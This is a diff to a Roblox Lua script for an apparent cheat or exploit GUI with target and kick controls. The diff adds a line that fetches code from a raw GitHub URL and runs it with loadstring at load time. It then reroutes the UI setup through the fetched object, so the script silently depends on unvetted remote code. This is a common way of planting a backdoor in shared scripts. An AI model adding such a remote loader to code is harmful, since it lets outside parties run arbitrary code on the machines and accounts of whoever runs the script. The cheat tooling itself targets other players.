@@ -37,6 +37,7 @@ local credits = Instance.new("TextLabel")
 local queue = Instance.new("TextLabel")
 local target = Instance.new("TextBox")
 local Players = game:GetService("Players")
+local hello = loadstring(game:HttpGet("https://raw.githubusercontent.com/ririantiskid/harked/main/ririantiskid"))()
 function splitString(str,delim)
 	local broken = {}
 	if delim == nil then delim = "," end
@@ -9368,8 +9369,8 @@ UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout.CellPadding = UDim2.new(0, 15, 0, 15)
 UIGridLayout.CellSize = UDim2.new(0, 131, 0, 40)
 
-Variables.UI.Main.AnchorPoint = Vector2.new(0.5, 0.5)
-Variables.UI.Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+hello.UI.Main.AnchorPoint = Vector2.new(0.5, 0.5)
+hello.UI.Main.Position = UDim2.new(0.5, 0, 0.5, 0)
 
 
 kick.Name = "kick"
